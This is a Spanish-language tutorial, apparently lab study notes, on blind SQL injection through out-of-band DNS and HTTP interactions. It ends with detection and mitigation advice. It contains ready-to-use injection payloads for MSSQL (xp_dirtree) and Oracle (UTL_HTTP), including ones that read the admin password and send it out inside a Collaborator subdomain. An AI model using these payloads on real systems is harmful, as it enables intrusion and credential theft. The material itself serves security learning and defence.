# Explotación Blind SQLi mediante técnicas Out‑Of‑Band

---



OAST se refiere a técnicas que provocan **interacciones de red salientes** desde el sistema objetivo hacia un servidor controlado por el atacante (DNS, HTTP, SMB, etc.).

Cuando la app ejecuta la consulta vulnerable en un hilo separado (consulta original en un hilo y consulta de cookie en un nuevo hilo) o su respuesta no depende de la ejecución de esa query, las técnicas tradicionales (ver/errores/tiempos) no funcionan. OAST permite detectar y exfiltrar datos mediante la observación de interacciones externas provocadas por la base de datos vulnerable.

Las interacciones más fiables suelen usar **DNS** porque muchas redes permiten peticiones DNS salientes y los resolvers realizarán la consulta por el atacante (o por un servicio como Burp Collaborator) incluso si otros protocolos están bloqueados.

`Nota`: Resolver es el componente que recibe una consulta DNS y se encarga de resolverla paso a paso hasta obtener la respuesta final. Es el intermediario entre tu sistema y los servidores autoritativos que contienen la información real.

---

## Herramientas útiles

* **Burp Collaborator**: servicio que genera subdominios únicos y registra cualquier interacción DNS/HTTP/SMTP/SMB/etc. Burp Professional integra un cliente que automatiza la comprobación. Ideal para labs y pentests.
[Burp Collaborator doc](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
* **Otras opciones públicas/privadas**: Interactsh, Canarytokens, servicios DNS propios. En pruebas autorizadas puedes correr tu propio servidor DNS y recoger solicitudes.

---

## Flujo general de un ataque OAST

1. **Generás un identificador único** (p. ej. `abc123.attacker.com`) usando Collaborator o tu servidor.
2. **Construís un payload** que haga que la base de datos realice una consulta DNS/HTTP hacia ese host cuando se cumpla una condición o para incorporar datos (exfil).
3. **Envíás la petición** vulnerable (por ejemplo con cookie TrackingId inyectado).
4. **Observás en Collaborator** si llega una petición DNS/HTTP con el subdominio generado; si llega, confirmás que la inyección fue ejecutada y, dependiendo del payload, obtendrás datos (por ejemplo el valor de una columna en el subdominio).

---

## Efectividad

* Las resoluciones DNS a menudo son permitidas en egress.
* Las consultas DNS transportan texto en el nombre de dominio, por lo que puedes meter fragmentos de datos (hex/base32) en el subdominio.
* Un solo evento DNS confirma ejecución remota y puede contener información exfiltrada.

---

## Ejemplos de técnicas por SGBD

### 5.1 Microsoft SQL Server (T‑SQL)

Funciones/procs que pueden ejecutar acciones que causan consultas DNS/SMB:

* `xp_dirtree`, `xp_subdirs`, `xp_fileexist`, `xp_cmdshell` (si están habilitadas) pueden provocar accesos a rutas UNC que a su vez generan resoluciones DNS/SMB en el lado de un resolver o controlador.

**Ejemplo (xp_dirtree hacia un host controlado por Collaborator):**

```sql
'; exec master..xp_dirtree '//<UNIQUE_ID>.collaborator.net/a'--
```

* El primer `//` indica una ruta UNC; el servicio de resolución intentará resolver `<UNIQUE_ID>.collaborator.net` y esto aparece en Collaborator.
* `xp_cmdshell` también puede usarse para ejecutar `nslookup` o `ping` hacia el dominio si está habilitado (máximo privilegio requerido).

**Exfiltración de datos concatenados (ejemplo):**

```sql
'; DECLARE @p varchar(8000); SET @p=(SELECT TOP 1 password FROM users WHERE username='admin'); EXEC('master..xp_dirtree "//'+@p+'.<UNIQUE>.collaborator.net/a"')--
```

Esto coloca la contraseña en el subdominio y desencadena la resolución.

**Notas:** muchos entornos deshabilitan `xp_*` o `xp_cmdshell` por seguridad; funciona cuando están presentes y la DB tiene permisos.

### MySQL

MySQL no tiene procedimientos extendidos de Windows integrados, pero puedes forzar peticiones HTTP/DNS si el servidor tiene UDFs (user defined functions) o si el servidor hace peticiones fuera de banda mediante funciones específicas (raro en entornos administrados).
Una técnica más común es crear una consulta que invoque funciones XML que a su vez contacten hosts (depende de configuración) o usar herramientas intermedias si tienes comandos.

### PostgreSQL

* Postgres no tiene procedimientos equivalentes a `xp_cmdshell` por defecto, pero extensiones (pwned envs) o funciones `COPY TO PROGRAM` (si habilitado) pueden ejecutar comandos.
* Alternativa: usar funciones `dblink` o `postgres_fdw` si están disponibles y apuntarlas a un servidor que provoque un lookup remoto.

### Oracle

* Oracle puede usar `UTL_HTTP.REQUEST` para hacer peticiones HTTP salientes si el DB tiene permisos y la ACL de red lo permite.
* Otra vía es `UTL_INADDR.get_host_address` (dependiendo de versión/configuración), que puede provocar resolución DNS.

**Ejemplo Oracle (conceptual):**

```sql
' || UTL_HTTP.request('http://<UNIQUE>.collaborator.net/') || '
```

### Resumen práctico

* En Windows SQL Server, `xp_dirtree`/`xp_cmdshell` son las opciones más directas para DNS/SMB OAST.
* En Oracle/Postgres/MySQL, a menudo se requiere privilegios/funciones/extensiones para las peticiones OOB; sin ellos, OAST puede no ser viable.

---

## Formas de exfiltrar datos en la interacción OOB

* **Embed en subdominio:** `password.<HEX>.collaborator.net` (codifica/segmenta datos largos).
* **Hashing / encoding:** conviene hex/base32/base64 o URL‑safe para evitar caracteres prohibidos en nombres DNS y para dividir en chunks.
* **Segmentación:** si el dato es largo, envíalo en varios intentos (por ejemplo: `1-<chunk1>.<UNIQUE>...`, `2-<chunk2>...`).

**Ejemplo encadenado (MSSQL):**

```sql
'; DECLARE @p varchar(8000);SET @p=(SELECT TOP 1 password FROM users WHERE username='admin');EXEC('master..xp_dirtree "//'+CONVERT(varchar(200), HASHBYTES('MD5',@p),2)+'.<UNIQUE>.collaborator.net/a"')--
```

Aquí se envía un hash (reduce tamaño y evita caracteres problemáticos).

---

## Práctica en Burp Collaborator

1. Generá un nuevo payload OAST en Collaborator o usa el cliente integrado en Burp.
2. Inserta el subdominio único en tu payload según SGBD.
3. Envía la petición vulnerable.
4. Pollea Collaborator: si hay una entrada de tipo DNS/HTTP/SMB con tu ID, la inyección fue ejecutada y posiblemente hayas exfiltrado datos.

**Importante:** Collaborator registra peticiones y te muestra la fuente, el tipo y el contenido (cuando aplica).

---

## Limitaciones, detección y contradicciones

* **Privilegios**: muchas técnicas requieren funciones o procedimientos privilegiados (xp_*, utl_http, etc.).
* **Firewalls / egress filtering**: si el entorno bloquea egress DNS o fuerza resolvers internos sin salida, OAST puede fallar.
* **WAF / detección**: patrones UNC `//host/...` o llamadas a `xp_cmdshell` suelen ser detectadas.
* **Tamaño**: los registros DNS limitan la longitud de cada label (~63 bytes) y del dominio total (~253 bytes), por lo que hay que fragmentar datos.
* **Ruido**: muchas resoluciones internas o caching pueden complicar correlación; usar IDs únicos ayuda.

---

## Detección y mitigación

* **Egress filtering**: bloquear/detección de resoluciones DNS no autorizadas y restringir salidas HTTP/SMB.
* **Principle of least privilege**: deshabilitar `xp_cmdshell`, restringir `UTL_HTTP`, evitar extensiones no necesarias.
* **Registro y alerta**: monitorizar patrones inusuales (resoluciones a dominios raros, invocaciones a funciones peligrosas).
* **WAF/IPS tuning**: detectar y bloquear patrones UNC/`xp_*` y payloads con subdominios dinámicos.

---


